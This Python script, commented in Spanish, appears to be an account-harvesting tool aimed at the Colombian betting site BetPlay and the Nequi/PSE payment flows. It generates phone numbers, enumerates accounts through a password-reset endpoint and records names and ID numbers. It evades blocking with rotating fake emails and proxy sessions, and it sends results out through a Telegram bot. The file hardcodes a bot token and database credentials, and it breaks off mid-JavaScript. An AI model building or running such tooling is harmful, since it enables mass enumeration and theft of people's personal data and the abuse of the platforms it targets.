import asyncio
import json
import logging
import os
import random
import re
import sys
import traceback
import uuid
from collections import deque
from datetime import datetime, timezone
from typing import Dict, Tuple, Optional

import aiohttp
from aiohttp import ClientTimeout
from playwright.async_api import async_playwright

from sqlalchemy import (create_engine, Column, Integer, String, Text,
                        DateTime, update, text)
from sqlalchemy.orm import declarative_base, sessionmaker
from sqlalchemy.exc import IntegrityError
from sqlalchemy.dialects.postgresql import insert as pg_insert

# ======================================================================
#  LOGS SIN BUFFER
# ======================================================================
try:
    sys.stdout.reconfigure(line_buffering=True)
    sys.stderr.reconfigure(line_buffering=True)
except Exception:
    pass

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger("extractor")


def utcnow():
    return datetime.now(timezone.utc).replace(tzinfo=None)


# ======================================================================
#  CONFIGURACIÓN
# ======================================================================
EN_RAILWAY      = bool(os.getenv("RAILWAY_ENVIRONMENT"))
DEBUG           = not EN_RAILWAY
MOSTRAR_VENTANA = not EN_RAILWAY
SLOW_MO         = 250
USAR_PROXY      = False
ROTAR_SESION    = True
PAIS            = "co"
X_CUSTOM_VERSION = "4.0.71"

CONCURRENCIA = 3 if EN_RAILWAY else 1
LIMITE       = None
AUTO_IMPORT  = True

TELEGRAM_TOKEN   = "8005799410:AAGe720T8KDkwL9v32ldhMpWitHzANN3Wwk"
TELEGRAM_CHAT_ID = "1415509092"

CORREOS = []
NOMBRES = [
    "carlos", "juan", "andres", "david", "jose", "luis", "miguel", "angel",
    "kevin", "santiago", "sebastian", "daniel", "alejandro", "camilo", "felipe",
    "oscar", "julian", "brayan", "jeison", "maria", "laura", "andrea", "diana",
    "paula", "carolina", "valentina", "daniela", "juliana", "sara", "paola",
]
SUFIJOS = [
    "", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13",
    "21", "22", "23", "31", "77", "99", "123", "1234", "12345", "2020", "2021",
]

PREFIJOS_PESO = {
    "300": 6, "301": 5, "302": 4, "303": 4, "304": 4, "305": 4,
    "310": 6, "311": 6, "312": 6, "313": 6, "314": 6, "315": 6,
    "316": 6, "317": 6, "318": 6, "319": 6,
    "320": 5, "321": 5, "322": 5, "323": 4, "324": 3,
}
PREFIJOS_SET = set(PREFIJOS_PESO)

UA_BROWSER = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")

PROXIES = [
    {"server": "http://geo.iproyal.com:12321", "username": "TU_USUARIO", "password": "TU_PASSWORD"},
]

# ======================================================================
#  DATABASE SETUP
# ======================================================================
URL_INTERNA = "postgresql://postgres:VHvfQHhexqvHhlJDpzBJCltcWseWRvmg@postgres.railway.internal:5432/railway"
URL_PUBLICA = "postgresql://postgres:VHvfQHhexqvHhlJDpzBJCltcWseWRvmg@reseau.proxy.rlwy.net:42532/railway"

DATABASE_URL = os.getenv("DATABASE_URL", URL_PUBLICA)
if DATABASE_URL.startswith("postgres://"):
    DATABASE_URL = DATABASE_URL.replace("postgres://", "postgresql://", 1)
if "proxy.rlwy.net" in DATABASE_URL and "sslmode" not in DATABASE_URL:
    DATABASE_URL += ("&" if "?" in DATABASE_URL else "?") + "sslmode=require"

engine = create_engine(
    DATABASE_URL, pool_size=5, max_overflow=10,
    pool_pre_ping=True, pool_recycle=300,
)
SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)
Base = declarative_base()


class FoundNumber(Base):
    __tablename__ = "found_numbers"
    id = Column(Integer, primary_key=True, index=True)
    celular = Column(String(20), unique=True, index=True)
    ref3 = Column(String(100))
    nombre = Column(String(100))
    cedula = Column(String(50))
    created_at = Column(DateTime, default=utcnow)


class CelularUsado(Base):
    __tablename__ = "celulares_usados"
    celular = Column(String(20), primary_key=True)
    created_at = Column(DateTime, default=utcnow)


class Stats(Base):
    __tablename__ = "stats"
    id = Column(Integer, primary_key=True, index=True)
    intentos = Column(Integer, default=0)
    aciertos = Column(Integer, default=0)
    updated_at = Column(DateTime, default=utcnow, onupdate=utcnow)


class StatsLegacy(Base):
    __tablename__ = "stats_legacy"
    clave = Column(String(40), primary_key=True)
    valor = Column(Text)


class KV(Base):
    __tablename__ = "kv"
    key = Column(String(50), primary_key=True)
    value = Column(String(500))


class CorreoBloqueado(Base):
    __tablename__ = "correos_bloqueados"
    correo = Column(String(120), primary_key=True)
    motivo = Column(String(200))
    created_at = Column(DateTime, default=utcnow)


Base.metadata.create_all(bind=engine)


def guardar_kv(k, v):
    db = SessionLocal()
    try:
        row = db.query(KV).filter(KV.key == k).first()
        if row:
            row.value = str(v)
        else:
            db.add(KV(key=k, value=str(v)))
        db.commit()
    except Exception as e:
        db.rollback()
        print(f"[!] guardar_kv: {e}")
    finally:
        db.close()


def leer_kv(k, default=None):
    db = SessionLocal()
    try:
        row = db.query(KV).filter(KV.key == k).first()
        return row.value if row else default
    except Exception:
        return default
    finally:
        db.close()


def ensure_contadores():
    """Crea las filas intentos/aciertos si no existen (sin pisar las importadas)."""
    db = SessionLocal()
    try:
        for k in ("intentos", "aciertos"):
            if not db.query(StatsLegacy).filter(StatsLegacy.clave == k).first():
                db.add(StatsLegacy(clave=k, valor="0"))
        db.commit()
    except Exception as e:
        db.rollback()
        print(f"[!] ensure_contadores: {e}")
    finally:
        db.close()


def _localizar(nombre):
    for base in (os.getcwd(), os.path.dirname(os.path.abspath(__file__))):
        ruta = os.path.join(base, nombre)
        if os.path.exists(ruta):
            return ruta
    return None


# ======================================================================
#  CORREOS BLOQUEADOS
# ======================================================================
_bloqueados_cache = None


def _bloqueados():
    global _bloqueados_cache
    if _bloqueados_cache is None:
        recargar_bloqueados()
    return _bloqueados_cache


def recargar_bloqueados():
    global _bloqueados_cache
    db = SessionLocal()
    try:
        _bloqueados_cache = {r[0] for r in db.query(CorreoBloqueado.correo).all()}
    finally:
        db.close()


def contar_bloqueados() -> int:
    db = SessionLocal()
    try:
        return db.query(CorreoBloqueado).count()
    finally:
        db.close()


def marcar_bloqueado(correo, motivo=""):
    db = SessionLocal()
    try:
        if not db.query(CorreoBloqueado).filter(CorreoBloqueado.correo == correo).first():
            db.add(CorreoBloqueado(correo=correo, motivo=motivo[:200]))
            db.commit()
    except Exception as e:
        db.rollback()
        print(f"[!] marcar_bloqueado: {e}")
    finally:
        db.close()
    _bloqueados().add(correo)
    print(f"[BLOQUEADO] {correo} -> {motivo}")


# ======================================================================
#  RETRY DNS
# ======================================================================
async def _goto_con_retry(page, url, intentos=3):
    for i in range(intentos):
        try:
            await page.goto(url, wait_until="domcontentloaded", timeout=60000)
            return True
        except Exception as e:
            if "ERR_NAME_NOT_RESOLVED" in str(e) and i < intentos - 1:
                print(f"[WARN] DNS falló, reintentando en {1.5*(i+1)}s...")
                await asyncio.sleep(1.5 * (i + 1))
                continue
            raise
    return False


# ======================================================================
#  CORREOS ROTATIVOS
# ======================================================================
_indice_correo = 0


def _lista_correos():
    global CORREOS
    if not CORREOS:
        for nombre in NOMBRES:
            for suf in SUFIJOS:
                CORREOS.append(f"{nombre}{suf}@gmail.com")
    return CORREOS


def correo_actual() -> str:
    global _indice_correo
    lst = _lista_correos()
    n = len(lst)
    bloqueados = _bloqueados()
    for _ in range(n):
        c = lst[_indice_correo % n]
        if c not in bloqueados:
            return c
        _indice_correo += 1
    return lst[_indice_correo % n]


def avanzar_correo() -> str:
    global _indice_correo
    _indice_correo += 1
    nuevo = correo_actual()
    try:
        guardar_kv("indice_correo", _indice_correo)
    except Exception:
        pass
    print(f"[i] Correo cambiado -> {nuevo}")
    return nuevo


def cargar_correo_guardado():
    global _indice_correo
    try:
        guardado = leer_kv("indice_correo")
        if guardado is not None:
            _indice_correo = int(guardado)
    except Exception:
        pass


# ======================================================================
#  CHECKER BETPLAY
# ======================================================================
HEADERS = {
    "accept": "application/json, text/plain, */*",
    "accept-language": "es-ES,es;q=0.9",
    "content-type": "application/json; charset=UTF-8",
    "origin": "https://betplay.com.co",
    "referer": "https://betplay.com.co/",
    "x-custom-version": X_CUSTOM_VERSION,
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36",
    "sec-ch-ua": '"Google Chrome";v="155", "Chromium";v="155", "Not(A:Brand";v="24"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
}


class BetplayChecker:
    def __init__(self):
        self.session: Optional[aiohttp.ClientSession] = None

    async def init_session(self) -> bool:
        connector = aiohttp.TCPConnector(limit=200, limit_per_host=50,
                                         enable_cleanup_closed=True, ttl_dns_cache=300)
        self.session = aiohttp.ClientSession(
            headers=HEADERS, connector=connector,
            timeout=ClientTimeout(total=10, connect=5),
            cookie_jar=aiohttp.CookieJar(),
        )
        try:
            async with self.session.get("https://betplay.com.co/", ssl=True,
                                        timeout=ClientTimeout(total=5)) as resp:
                return resp.status == 200
        except Exception as e:
            logger.error(f"Error init betplay: {type(e).__name__}: {e}")
            return False

    async def close(self):
        if self.session and not self.session.closed:
            await self.session.close()

    async def verificar_documento(self, doc: str) -> Tuple[bool, Dict]:
        url = f"https://betplay.com.co/reverse-proxy/accounts/{doc}/forgotten-password-document-number"
        for intento in range(2):
            try:
                async with self.session.post(url, json={}, ssl=True,
                                             timeout=ClientTimeout(total=8)) as resp:
                    status = resp.status
                    try:
                        data = await resp.json()
                    except Exception:
                        data = {}
                    if status == 200:
                        if isinstance(data, dict) and data.get("code") == 505:
                            if intento == 0:
                                continue
                            return False, data
                        if data and any(v for v in data.values() if v):
                            return True, data
                        return False, data or {"message": "No registrado"}
                    if status == 404:
                        return False, {"message": "No registrado"}
                    if status == 429:
                        await asyncio.sleep(0.5)
                        continue
                    return False, {"status": status, "message": "Error HTTP"}
            except Exception:
                if intento == 1:
                    return False, {"error": "Max retries"}
                continue
        return False, {"error": "Max retries"}


# ======================================================================
#  MEMORIA / ESTADÍSTICAS  (lee y escribe en stats_legacy)
# ======================================================================
class MemoriaDB:
    def __init__(self):
        pass

    def _leer(self, clave, default=0):
        db = SessionLocal()
        try:
            row = db.query(StatsLegacy).filter(StatsLegacy.clave == clave).first()
            if not row or row.valor in (None, ""):
                return default
            return int(float(row.valor))
        except Exception:
            return default
        finally:
            db.close()

    def _inc(self, clave, delta):
        """Incremento atómico sobre stats_legacy."""
        db = SessionLocal()
        try:
            res = db.execute(
                text("UPDATE stats_legacy "
                     "SET valor = ((COALESCE(NULLIF(valor,''),'0'))::bigint + :d)::text "
                     "WHERE clave = :k"),
                {"d": delta, "k": clave})
            if res.rowcount == 0:
                db.add(StatsLegacy(clave=clave, valor=str(delta)))
            db.commit()
        except Exception as e:
            db.rollback()
            print(f"[!] _inc {clave}: {e}")
        finally:
            db.close()

    @property
    def data(self):
        return {"intentos": self._leer("intentos"),
                "aciertos": self._leer("aciertos")}

    async def registrar(self, celular, exito):
        self._inc("intentos", 1)
        if exito:
            self._inc("aciertos", 1)

    def tasa_acierto(self):
        intentos = self._leer("intentos")
        aciertos = self._leer("aciertos")
        return (aciertos / intentos) if intentos > 0 else 0.0

    def resumen(self):
        intentos = self._leer("intentos")
        aciertos = self._leer("aciertos")
        lineas = ["📈 <b>Estadísticas</b>",
                  f"Intentos: {intentos}",
                  f"Aciertos: {aciertos}",
                  f"Tasa: {self.tasa_acierto()*100:.2f}%",
                  f"Correos bloqueados: {contar_bloqueados()}",
                  f"Números usados: {contar_usados()}", ""]
        return "\n".join(lineas)


mem = MemoriaDB()


# ======================================================================
#  TELEGRAM
# ======================================================================
def contar_existentes() -> int:
    db = SessionLocal()
    try:
        return db.query(FoundNumber).count()
    finally:
        db.close()


def contar_usados() -> int:
    db = SessionLocal()
    try:
        return db.query(CelularUsado).count()
    finally:
        db.close()


class Telegram:
    def __init__(self, token, chat_id=""):
        self.token = token
        self.chat_id = str(chat_id) if chat_id else ""
        self.session: Optional[aiohttp.ClientSession] = None
        self.offset = 0
        self.contador_msg_id = None
        self.activo = bool(token) and token != "PON_AQUI_TU_TOKEN"

    def url(self, method):
        return f"https://api.telegram.org/bot{self.token}/{method}"

    async def start(self):
        if not self.activo:
            return
        self.session = aiohttp.ClientSession(timeout=ClientTimeout(total=10))
        try:
            off = leer_kv("tg_offset")
            if off is not None:
                self.offset = int(off)
            async with self.session.get(self.url("getUpdates"),
                                        params={"timeout": 0},
                                        timeout=ClientTimeout(total=10)) as r:
                data = await r.json()
            for upd in data.get("result", []):
                self.offset = upd["update_id"] + 1
            guardar_kv("tg_offset", self.offset)
        except Exception as e:
            print(f"[!] Error inicializando Telegram: {e}")

    async def cerrar(self):
        if self.session and not self.session.closed:
            await self.session.close()

    async def _api(self, method, params=None, files=None):
        if not self.activo or not self.session:
            return None
        try:
            timeout = ClientTimeout(total=30)
            if files:
                data = aiohttp.FormData()
                for k, v in (params or {}).items():
                    data.add_field(k, str(v))
                for k, (nombre, contenido) in files.items():
                    data.add_field(k, contenido, filename=nombre)
                async with self.session.post(self.url(method), data=data, timeout=timeout) as r:
                    return await r.json()
            else:
                async with self.session.post(self.url(method), json=params or {}, timeout=timeout) as r:
                    return await r.json()
        except Exception as e:
            logger.error(f"telegram {method}: {type(e).__name__}: {e}")
            return None

    async def enviar(self, texto, chat_id=None):
        cid = chat_id or self.chat_id
        if not cid:
            return None
        res = await self._api("sendMessage", {"chat_id": cid, "text": texto, "parse_mode": "HTML"})
        if res and res.get("ok"):
            return res["result"]["message_id"]
        return None

    async def editar(self, msg_id, texto):
        if not self.chat_id:
            return
        await self._api("editMessageText", {"chat_id": self.chat_id,
                                            "message_id": msg_id, "text": texto})

    async def enviar_documento(self, contenido, caption="", chat_id=None, filename="datos.txt"):
        cid = chat_id or self.chat_id
        if not cid:
            return
        try:
            form = aiohttp.FormData()
            form.add_field("chat_id", str(cid))
            form.add_field("caption", caption)
            form.add_field("parse_mode", "HTML")
            form.add_field("document", contenido, filename=filename)
            async with self.session.post(self.url("sendDocument"), data=form,
                                         timeout=ClientTimeout(total=60)) as r:
                return await r.json()
        except Exception as e:
            logger.error(f"Send document error: {e}")
            return None

    async def actualizar_contador(self):
        if not self.activo or not self.chat_id:
            return
        texto = (f"📊 <b>Cuentas guardadas:</b> {contar_existentes()}\n"
                 f"🎯 Tasa: {mem.tasa_acierto()*100:.2f}%\n"
                 f"🚫 Correos bloqueados: {contar_bloqueados()}\n"
                 f"🔢 Números usados: {contar_usados()}")
        if self.contador_msg_id:
            await self.editar(self.contador_msg_id, texto)
        else:
            try:
                self.contador_msg_id = await self.enviar(texto)
            except Exception as e:
                print(f"[!] Error enviando contador inicial: {e}")

    async def notificar_guardado(self, celular, referencia, nombre=""):
        extra = f"\n👤 {nombre}" if nombre else ""
        await self.enviar(f"✅ Nueva cuenta\n📄 Ref: <code>{referencia}</code>\n"
                          f"📱 {celular}{extra}\n📊 Total: {contar_existentes()}")
        await self.actualizar_contador()

    async def procesar_update(self, upd):
        msg = upd.get("message") or {}
        texto = (msg.get("text") or "").strip()
        chat_id = str((msg.get("chat") or {}).get("id", ""))

        print(f"[DEBUG TELEGRAM] Recibido: '{texto}' de ChatID: {chat_id}")
        if not texto or not chat_id:
            return

        if not self.chat_id:
            self.chat_id = chat_id
            print(f"[DEBUG TELEGRAM] ChatID guardado: {self.chat_id}")

        cmd = texto.split()[0].split("@")[0].lower()
        print(f"[DEBUG TELEGRAM] Comando detectado: {cmd}")

        if cmd in ("/start", "/ayuda", "/help"):
            await self.enviar(
                "🤖 <b>Bot extractor DB</b>\n\n"
                "/contador — cuentas guardadas\n"
                "/descargar — descarga existentes.txt (DB)\n"
                "/numeros — celulares en formato +57 (DB)\n"
                "/correo — correo actual\n"
                "/bloqueados — correos bloqueados\n"
                "/usados — total de números usados\n"
                "/stats — tasa de acierto\n", chat_id=chat_id)
        elif cmd == "/contador":
            await self.enviar(f"📊 Cuentas guardadas: <b>{contar_existentes()}</b>", chat_id=chat_id)
        elif cmd == "/correo":
            await self.enviar(f"📧 Correo actual: <code>{correo_actual()}</code>", chat_id=chat_id)
        elif cmd == "/usados":
            await self.enviar(f"🔢 Números usados en DB: <b>{contar_usados()}</b>", chat_id=chat_id)
        elif cmd == "/bloqueados":
            db = SessionLocal()
            try:
                regs = db.query(CorreoBloqueado).all()
                if not regs:
                    await self.enviar("No hay correos bloqueados todavía.", chat_id=chat_id)
                    return
                lista = "\n".join([f"{r.correo} | {r.motivo or '-'}" for r in regs])
                await self.enviar_documento(lista.encode('utf-8'),
                                            caption=f"correos_bloqueados.txt ({len(regs)})",
                                            chat_id=chat_id, filename="correos_bloqueados.txt")
            finally:
                db.close()
        elif cmd == "/reset_bloqueados":
            db = SessionLocal()
            try:
                db.query(CorreoBloqueado).delete()
                db.commit()
            finally:
                db.close()
            recargar_bloqueados()
            await self.enviar("♻️ Lista de correos bloqueados vaciada", chat_id=chat_id)
        elif cmd == "/descargar":
            db = SessionLocal()
            try:
                registros = db.query(FoundNumber).all()
                contenido = "\n".join([f"{r.ref3} | {r.celular}" for r in registros])
                if contenido:
                    await self.enviar_documento(contenido.encode('utf-8'),
                                                caption=f"existentes.txt ({len(registros)} registros)",
                                                chat_id=chat_id, filename="existentes.txt")
                else:
                    await self.enviar("Aún no hay datos en la DB", chat_id=chat_id)
            except Exception as e:
                print(f"[!] Error descargando DB: {e}")
                await self.enviar("Error al generar archivo", chat_id=chat_id)
            finally:
                db.close()
        elif cmd == "/numeros":
            db = SessionLocal()
            try:
                registros = db.query(FoundNumber).all()
                nums = []
                for r in registros:
                    d = re.sub(r"\D", "", r.celular)
                    if len(d) >= 10:
                        nums.append("57" + d[-10:])
                contenido = "\n".join(nums)
                if contenido:
                    await self.enviar_documento(contenido.encode('utf-8'),
                                                caption=f"{len(nums)} números en formato 57",
                                                chat_id=chat_id, filename="numeros_telegram.txt")
                else:
                    await self.enviar("Aún no hay datos en la DB", chat_id=chat_id)
            except Exception as e:
                print(f"[!] Error descargando números: {e}")
                await self.enviar("Error al generar archivo", chat_id=chat_id)
            finally:
                db.close()
        elif cmd == "/stats":
            await self.enviar(mem.resumen(), chat_id=chat_id)
        elif cmd == "/reset_stats":
            db = SessionLocal()
            try:
                db.execute(text("UPDATE stats_legacy SET valor = '0' "
                                "WHERE clave IN ('intentos','aciertos')"))
                db.commit()
                await self.enviar("♻️ Estadísticas reseteadas", chat_id=chat_id)
            except Exception as e:
                db.rollback()
                print(f"[!] Error reset stats: {e}")
            finally:
                db.close()
        else:
            await self.enviar("Comando no reconocido. Usa /ayuda", chat_id=chat_id)

    async def poll(self):
        if not self.activo:
            return
        while True:
            try:
                async with self.session.get(self.url("getUpdates"),
                                            params={"timeout": 30, "offset": self.offset},
                                            timeout=ClientTimeout(total=40)) as r:
                    data = await r.json()
                for upd in data.get("result", []):
                    self.offset = upd["update_id"] + 1
                    try:
                        await self.procesar_update(upd)
                    except Exception:
                        traceback.print_exc()
                if data.get("result"):
                    guardar_kv("tg_offset", self.offset)
            except asyncio.CancelledError:
                raise
            except Exception as e:
                logger.error(f"Error en polling: {e}")
                await asyncio.sleep(2)


tg = Telegram(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID)


# ======================================================================
#  PROXIES
# ======================================================================
def cargar_proxies():
    if PROXIES:
        return PROXIES
    ruta = os.path.join(os.path.dirname(os.path.abspath(__file__)), "proxies.txt")
    lista = []
    if os.path.exists(ruta):
        with open(ruta, encoding="utf-8") as f:
            for linea in f:
                linea = linea.strip()
                if not linea or linea.startswith("#"):
                    continue
                p = linea.split(":")
                if len(p) == 4:
                    host, port, user, pw = p
                    lista.append({"server": f"http://{host}:{port}", "username": user, "password": pw})
                elif len(p) == 2:
                    host, port = p
                    lista.append({"server": f"http://{host}:{port}"})
    return lista


def preparar_proxy(proxy):
    if not proxy:
        return None
    px = dict(proxy)
    if ROTAR_SESION and px.get("username") and px.get("password"):
        sid = uuid.uuid4().hex[:10]
        if f"_country-{PAIS}" not in px["password"]:
            px["password"] = px["password"] + f"_country-{PAIS}_session-{sid}_lifetime-10m"
        else:
            px["password"] = px["password"] + f"_session-{sid}"
    return px


# ======================================================================
#  GENERACIÓN INTELIGENTE + PERSISTENCIA DE USADOS
# ======================================================================
_pila_vecinos = deque(maxlen=20000)
_usados_cache = None
_usados_pendientes = set()


def _norm_celular(s):
    d = re.sub(r"\D", "", s or "")
    if len(d) > 10:
        d = d[-10:]
    return d


def _extraer_celular(texto):
    """Saca un celular colombiano (10 dígitos, empieza en 3) de un texto."""
    if not texto:
        return ""
    for tok in re.split(r"[\s,;\t|]+", texto):
        d = re.sub(r"\D", "", tok)
        if len(d) == 10 and d[0] == "3":
            return d
        if len(d) == 12 and d.startswith("57") and d[2] == "3":
            return d[2:]
    d = re.sub(r"\D", "", texto)
    if len(d) == 10 and d[0] == "3":
        return d
    if len(d) == 12 and d.startswith("57"):
        return d[2:]
    if len(d) > 10:
        for i in range(len(d) - 9):
            if d[i] == "3":
                return d[i:i + 10]
    for tok in re.split(r"[\s,;\t|]+", texto):
        d = re.sub(r"\D", "", tok)
        if len(d) == 10:
            return d
    return ""


def _usados():
    global _usados_cache
    if _usados_cache is None:
        recargar_usados()
    return _usados_cache


def recargar_usados():
    global _usados_cache
    db = SessionLocal()
    try:
        s = {r[0] for r in db.query(FoundNumber.celular).all()}
        s |= {r[0] for r in db.query(CelularUsado.celular).all()}
        _usados_cache = s
    finally:
        db.close()


def _marcar_usado(n):
    _usados().add(n)
    _usados_pendientes.add(n)


def flush_usados():
    if not _usados_pendientes:
        return
    lote = list(_usados_pendientes)
    _usados_pendientes.clear()
    db = SessionLocal()
    try:
        stmt = pg_insert(CelularUsado).on_conflict_do_nothing(index_elements=["celular"])
        db.execute(stmt, [{"celular": c} for c in lote])
        db.commit()
    except Exception as e:
        db.rollback()
        _usados_pendientes.update(lote)
        print(f"[!] flush_usados: {e}")
    finally:
        db.close()


async def flusher_usados():
    while True:
        await asyncio.sleep(8)
        try:
            flush_usados()
        except Exception:
            traceback.print_exc()


def _valido(s):
    return s[:3] in PREFIJOS_SET and s not in _usados()


def generar_aleatorio():
    pref = random.choices(list(PREFIJOS_PESO), weights=list(PREFIJOS_PESO.values()))[0]
    return pref + "".join(random.choice("0123456789") for _ in range(7))


PUENTES = {"300": ("301", "310"), "301": ("300", "310"), "310": ("311", "313"),
           "311": ("310", "312"), "312": ("311", "313"), "313": ("312", "314"),
           "314": ("313", "315"), "315": ("314", "316"), "316": ("315", "317"),
           "317": ("316", "318"), "318": ("317", "319"), "319": ("318", "320"),
           "320": ("319", "321"), "321": ("320", "322"), "322": ("321", "323"),
           "323": ("322", "324"), "324": ("323",)}


def agregar_vecinos(celular):
    base = int(celular)
    pref3 = celular[:3]
    orden = []
    for d in range(60):
        orden.append(base + d)
    for d in (10, 20, 50, 100):
        orden.append(base + d)
        orden.append(base - d)
    for pref in PUENTES.get(pref3, ()):
        for _ in range(5):
            orden.append(int(pref + "".join(random.choices("0123456789", k=7))))
    vistos = set(_pila_vecinos)
    for n in reversed(orden):
        s = str(n).zfill(10)
        if _valido(s) and s not in vistos:
            _pila_vecinos.appendleft(s)
            vistos.add(s)


def siguiente_celular():
    while _pila_vecinos:
        c = _pila_vecinos.popleft()
        if _valido(c):
            _marcar_usado(c)
            return c
    while True:
        c = generar_aleatorio()
        if _valido(c):
            _marcar_usado(c)
            return c


# ======================================================================
#  IMPORTADOR
# ======================================================================
def importar_existentes(nombre="existentes.txt"):
    ruta = _localizar(nombre)
    if not ruta:
        print(f"[import] no existe {nombre}")
        return 0
    print(f"[import] leyendo {ruta}")
    db = SessionLocal()
    nuevos = 0
    try:
        ya = {r[0] for r in db.query(FoundNumber.celular).all()}
        with open(ruta, encoding="utf-8", errors="ignore") as f:
            for linea in f:
                linea = linea.strip()
                if not linea:
                    continue
                partes = [p.strip() for p in linea.split("|")]
                cel = _extraer_celular(partes[-1])
                if len(cel) != 10 or cel in ya:
                    continue
                ya.add(cel)
                db.add(FoundNumber(celular=cel, ref3=(partes[0] if len(partes) >= 2 else "")))
                nuevos += 1
                if nuevos % 1000 == 0:
                    db.commit()
        db.commit()
    except Exception as e:
        db.rollback()
        print(f"[!] import existentes: {e}")
    finally:
        db.close()
    print(f"[import] existentes.txt -> {nuevos} nuevos")
    return nuevos


def importar_usados(nombre="celulares_usados.txt"):
    ruta = _localizar(nombre)
    if not ruta:
        print(f"[import] no existe {nombre}")
        return 0
    print(f"[import] leyendo {ruta}")
    db = SessionLocal()
    nuevos = 0
    lote = []
    try:
        ya = {r[0] for r in db.query(CelularUsado.celular).all()}
        with open(ruta, encoding="utf-8", errors="ignore") as f:
            for linea in f:
                cel = _extraer_celular(linea.strip())
                if len(cel) != 10 or cel in ya:
                    continue
                ya.add(cel)
                lote.append({"celular": cel})
                nuevos += 1
                if len(lote) >= 2000:
                    stmt = pg_insert(CelularUsado).on_conflict_do_nothing(index_elements=["celular"])
                    db.execute(stmt, lote)
                    db.commit()
                    lote.clear()
        if lote:
            stmt = pg_insert(CelularUsado).on_conflict_do_nothing(index_elements=["celular"])
            db.execute(stmt, lote)
            db.commit()
    except Exception as e:
        db.rollback()
        print(f"[!] import usados: {e}")
    finally:
        db.close()
    print(f"[import] celulares_usados.txt -> {nuevos} nuevos")
    return nuevos


def importar_stats_json(nombre="stats.json"):
    """Guarda stats.json en stats_legacy. NO pisa intentos/aciertos vivos."""
    ruta = _localizar(nombre)
    if not ruta:
        print(f"[import] no existe {nombre}")
        return 0
    print(f"[import] leyendo {ruta}")
    with open(ruta, encoding="utf-8", errors="ignore") as f:
        data = json.load(f)
    db = SessionLocal()
    n = 0
    try:
        for k, v in data.items():
            val = json.dumps(v, ensure_ascii=False) if isinstance(v, (dict, list)) else str(v)
            row = db.query(StatsLegacy).filter(StatsLegacy.clave == k).first()
            if k in ("intentos", "aciertos") and row:
                continue
            if row:
                row.valor = val
            else:
                db.add(StatsLegacy(clave=k, valor=val))
            n += 1
        db.commit()
    except Exception as e:
        db.rollback()
        print(f"[!] import stats: {e}")
    finally:
        db.close()
    print(f"[import] stats.json -> {n} claves")
    return n


def ejecutar_import():
    print("[import] cargando bases existentes a la DB...")
    n1 = importar_existentes()
    n2 = importar_usados()
    n3 = importar_stats_json()
    recargar_usados()
    print(f"[import] listo. existentes={n1} usados={n2} stats={n3}")


# ======================================================================
#  HELPERS DE NAVEGACIÓN
# ======================================================================
async def leer_texto(page):
    partes = []
    for fr in page.frames:
        try:
            partes.append(await fr.evaluate("() => document.body ? document.body.innerText : ''"))
        except Exception:
            pass
    return "\n".join(partes)


async def dump_paginas(context, etiqueta=""):
    if not DEBUG:
        return
    print(f"[DBG] --- páginas abiertas {etiqueta} ---")
    for i, pg in enumerate(context.pages):
        try:
            print(f"[DBG]   [{i}] {pg.url[:140]}")
        except Exception:
            pass
    print("[DBG] ---------------------------------")


async def screenshot(page, nombre):
    if not DEBUG:
        return
    try:
        os.makedirs("debug", exist_ok=True)
        ruta = os.path.join("debug", f"{nombre}.png")
        await page.screenshot(path=ruta, full_page=True)
        print(f"[DBG] screenshot -> {ruta}")
    except Exception as e:
        print(f"[DBG] screenshot falló: {e}")


async def clic_si_existe(page, texto, timeout=4000):
    try:
        b = page.locator(f'button:has-text("{texto}")').first
        await b.wait_for(state="visible", timeout=timeout)
        await b.click(force=True)
        return True
    except Exception:
        return False


async def clic_inmediato(page, texto, timeout=8000):
    try:
        b = page.locator(f'button:has-text("{texto}")').first
        await b.wait_for(state="visible", timeout=timeout)
        await b.click(force=True)
        return True
    except Exception:
        return False


async def texto_modal(page):
    for fr in page.frames:
        try:
            loc = fr.locator('.modal__content-message')
            if await loc.count() > 0:
                return (await loc.first.inner_text()).strip().lower()
        except Exception:
            pass
    return ""


def clasificar_modal(msg):
    if "no tiene una cuenta" in msg:
        return "sin_cuenta"
    if "no fue posible hacer la recarga" in msg or "vuelve a intentar" in msg:
        return "sin_cuenta"
    if "30 minutos" in msg or "límite" in msg:
        return "bloqueo"
    return "sin_cuenta"


async def resolver_paso_nequi(page, context, timeout=25000):
    fin = asyncio.get_event_loop().time() + timeout / 1000
    ya_recargo = False
    while asyncio.get_event_loop().time() < fin:
        msg = await texto_modal(page)
        if msg:
            return clasificar_modal(msg)
        try:
            if "pse.com.co" in page.url:
                return "ok"
        except Exception:
            pass
        try:
            if len(context.pages) > 1:
                return "ok"
        except Exception:
            pass
        if not ya_recargo:
            try:
                btn = page.locator('button:has-text("Recargar")').first
                if await btn.is_visible():
                    await btn.click(force=True)
                    ya_recargo = True
                    await page.wait_for_timeout(400)
                    continue
            except Exception:
                pass
        await page.wait_for_timeout(250)
    return "timeout"


JS_PSE_RAPIDO = """
async (correo) => {
    for (let i = 0; i < 40; i++) {
        if (window.prefs) break;
        await new Promise(r => setTimeout(r, 250));
    }
    if (!window.prefs) return {ok: false, error: 'prefs no cargadas'};
    try {
        const modal = document.getElementById('transactionSummaryModal');
        const btn = document.getElementById('btnTransactionSummaryContinue');
        if (modal && btn && !modal.hidden) {
            btn.click();
        } else if (typeof continueStartTransactionFlow === 'function') {
            continueStartTransactionFlow();
        }
    } catch (e) {}
    await new Promise(r => setTimeout(r, 800));
    if (window.prefs.AuthName && window.prefs.AuthName.length > 0) {
        return {ok: true, path: 'session'};
    }
    const el = document.getElementById('PNEMail');
    if (el) {
        el.value = correo;
        el.dispatchEvent(new Event('input', {bubbles: true}));
        el.dispatchEvent(new Event('keyup', {bubbles: true}));
    }
    try {
        if (typeof loadRegisterAndChooseQuestion === 'function') {
            loadRegisterAndChooseQuestion();
            await new Promise(r => setTimeout(r, 1500));
